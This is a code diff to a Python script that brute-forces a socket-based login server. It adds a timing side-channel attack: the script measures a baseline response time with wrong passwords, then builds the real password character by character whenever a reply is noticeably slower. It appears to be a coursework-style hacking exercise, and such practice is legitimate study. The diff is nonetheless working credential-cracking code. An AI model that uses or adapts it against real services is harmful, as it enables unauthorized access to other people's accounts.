@@ -2,6 +2,7 @@ import sys
 import socket
 import itertools
 import json
+from datetime import datetime
 
 
 def get_bruce_force():
@@ -38,6 +39,32 @@ def get_dict_pass(p_file):
             yield pv
 
 
+class RespTimes:
+    def __init__(self, cycle=9, deviation_percent=900, treshold=0.002):
+        self.cycle = cycle
+        self.resps = []
+        self.current_resp = 0
+        self.is_charged = False
+        self.avg_val = None
+        self.deviation_percent = deviation_percent
+        self.treshold = treshold
+
+    def add_resp_time(self, resp_time):
+        if self.is_charged:
+            if resp_time > self.avg_val * (1 + self.deviation_percent / 100) + self.treshold:
+                return 1
+            self.resps[self.current_resp] = resp_time
+            self.current_resp += 1
+            if self.current_resp > self.cycle - 1:
+                self.current_resp = 0
+        else:
+            self.resps.append(resp_time)
+            if len(self.resps) == self.cycle:
+                self.avg_val = sum(self.resps) / len(self.resps)
+                self.is_charged = True
+        return 0
+
+
 login = ''
 password = ' '
 pass_ok = 0
@@ -58,18 +85,30 @@ while not login:
 
 common_logins.close()
 
+
+resp_times = RespTimes()
 password = ''
 pass_to_try_gen = get_bruce_force_1ch()
 while not pass_ok:
-    pass_to_try = next(pass_to_try_gen)
-    conn.send(f'{{"login": "{login}", "password": "{password + pass_to_try}"}}'.encode())
-    serv_resp = json.loads(conn.recv(1024).decode())
-    if serv_resp['result'] == 'Exception happened during login':
-        password += pass_to_try
-        pass_to_try_gen = get_bruce_force_1ch()
-    elif serv_resp['result'] == 'Connection success!':
-        pass_ok = 1
-        password += pass_to_try
+    start_sess_dt = datetime.now()
+    if not resp_times.is_charged:  # learning the standard time of answer
+        conn.send(f'{{"login": "{login}", "password": "wrong_one_12312121212"}}'.encode())
+        serv_resp = json.loads(conn.recv(100).decode())
+        end_sess_dt = datetime.now()
+        resp_times.add_resp_time((end_sess_dt - start_sess_dt).total_seconds())
+    else:
+        pass_to_try = next(pass_to_try_gen)
+        conn.send(f'{{"login": "{login}", "password": "{password + pass_to_try}"}}'.encode())
+        x = conn.recv(100).decode()
+        serv_resp = json.loads(x)
+        end_sess_dt = datetime.now()
+          # print(x, login, password + pass_to_try, end_sess_dt - start_sess_dt)
+        if resp_times.add_resp_time((end_sess_dt - start_sess_dt).total_seconds()):
+            password += pass_to_try
+            pass_to_try_gen = get_bruce_force_1ch()
+        elif serv_resp['result'] == 'Connection success!':
+            pass_ok = 1
+            password += pass_to_try
 
 
 print(f'{{"login": "{login}", "password": "{password}"}}')
